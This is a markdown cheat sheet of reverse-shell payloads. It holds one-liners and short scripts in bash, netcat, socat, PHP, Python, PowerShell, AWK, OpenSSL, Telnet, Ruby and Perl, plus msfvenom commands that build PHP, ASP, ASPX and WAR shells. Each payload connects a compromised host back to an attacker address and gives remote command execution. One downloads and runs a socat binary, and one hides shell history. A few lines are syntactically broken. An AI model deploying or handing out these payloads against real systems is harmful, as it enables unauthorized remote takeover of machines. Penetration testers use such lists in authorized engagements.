# Reverse Shell

## Resources

https://alamot.github.io/reverse_shells/
https://github.com/ShutdownRepo/shellerator

## Basics / Classical {#basics--classical}

Reverse shell:

```
nc -nv IP 443 -e /bin/bash
ncat --udp IP 443 -e /bin/bash
```

```
/bin/sh | nc ATTACKING-IP 443
```

OR

```
rm -f /tmp/x; mknod /tmp/x p && nc <IP> <PORT> 0</tmp/x | /bin/bash 1>/tmp/x 
rm -f /tmp/x; mknod /tmp/x p && /bin/nc.openbsd <IP> <PORT> 0</tmp/x | /bin/bash 1>/tmp/x

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> > /tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc.openbsd <IP> <PORT> > /tmp/f
```

OR

```
/bin/nc.traditional <IP> <PORT> -e /bin/bash 
/bin/nc.traditional <IP> <PORT> -c /bin/bash
```

## Socat reverse shell allow to have TTY

### Attacker machine

socat file:`tty`,raw,echo=0 tcp-listen:4444

### Target machine

```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod+x/tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sanetcp:100.100.100.100:4444
```

## Reverse shell using ngrok

### On attacker (term1)

ngrok tcp 12345

### On attacker (term2)

nc -lvp 12345

### On target, use your reverse shell payload on the ngrok tunnel target

```
nc 0.tcp.ngrok.io <port> -e /bin/sh
```

## PHP Reverse Shell

```
php -r '$s=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$s=fsockopen("<IP>",<PORT>);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$s=fsockopen("<IP>",<PORT>);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$s=fsockopen("<IP>",<PORT>);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$s=fsockopen("<IP>",<PORT>);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$s=fsockopen("<IP>",<PORT>);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

```
msfvenom -p php/shell/reverse_tcp LHOST=IP LPORT=443 -f raw -o shell.php
```

#You can also use the php reverse shell with a complete handler by pentest-monkey, available in Kali by default

### Windows

```
msfvenom -p windows/shell_reverse_tcp -b “\x00\x0a\x0d” LHOST=IP LPORT=443 -f asp > user_TCP_RS.asp
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -e x86/shikata_ga_nai -o shell.aspx
```

## Netcat equivalent for Powershell !

- https://github.com/besimorhino/powercat

## Linux

```
bash -i >& /dev/tcp/ATTACKING-IP/443 0>&1
bash -i >& /dev/tcp/10.10.14.10/443 0>&1
```

## AWK

```
awk 'BEGIN {s = "/inet/tcp/0/10.10.14.10/80"; while(42) { do{ printf "shell>" |& s; s |& getline c;\ 
if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

USING AWK

```
#!/usr/bin/awk -f
BEGIN {
    s = "/inet/tcp/0/<IP>/<PORT>"
    while(42) {
        do{
            printf "shell>" |& s
            s |& getline c
            if(c){
                while ((c |& getline) > 0)
                print $0 |& s
                close(c)
            }
        } while(c != "exit")
        close(s)
    }
}
```

Using GAWK

```
#!/usr/bin/gawk -f
BEGIN {
        Port    =       443
        Prompt  =       "pwn> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```

## Python

```
#!/usr/bin/env python
import socket,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.11.0.179",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.system("/bin/sh -i")
```

```
python -c “import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('IP',443));\
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system('/bin/sh -i')”
```

UDP

```
python -c 'import socket,pty,os;lhost = "IP"; lport = 100;\
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect((lhost, lport));\
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);\
os.putenv("HISTFILE","/dev/null"); pty.spawn("/bin/bash"); s.close();'
```

## Python PTY Shells python-pty-shells

### Can be very good

```
simpleHTTPServer
wget ... -O /dev/shm/.rev.py
python tcp_pty_shell_handler -b ip:port
```

## **Windows - Powershell Oneliner RevShell**

```pwsh
###Change IP

$client = New-Object System.Net.Sockets.TCPClient("{{IP_ADDRESS}},1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Windows - WAR Reverse Shell

### Build the payload

```
msfvenom -p java/shell_reverse_tcp LHOST=IP LPORT=443 -f war -o shell.war
```

### File Structure

reverse_shell.war
|
|\_\_reverse\_shell.jsp
|
|_____META-INF/
|
|_____WEB-INF/
|
|____web.xml

### Explanations

web.xml is asking for a reference to /cmd.jsp, when you upload the .war you can then access to /cmd/ directory, just ask cmd.jsp and that's it

```
<IP>/reverse_shell/reverse_shell.jsp
nc -nvlp 443
```

## OpenSSL

### Generate certificate:

`openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes`

### Listener:

```
openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>
```

### Reverse Shell:

```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s;\
rm /tmp/s mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s;\
rm /tmp/s
```

## Telnet

```
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```

OR

```
rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet <IP> <PORT> > f
rm -f x; mknod x p && telnet <IP> <PORT> 0<x | /bin/bash 1>x
```

(Listen on the port 443 machine)

## Using LUA

```
In MSF => payload/cmd/unix/reverse_lua

##OR this tool: https://github.com/cuhsat/palantir
```

## Ruby

### Linux

```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<IP>",<PORT>);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
ruby -rsocket -e 'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Windows

```
ruby -rsocket -e "c=TCPSocket.new('<IP>',<PORT>);while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"
```

## Perl

### Windows

```
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Linux

```
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))\
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");\
open(STDERR,">&S");exec("/bin/sh -i");};'
```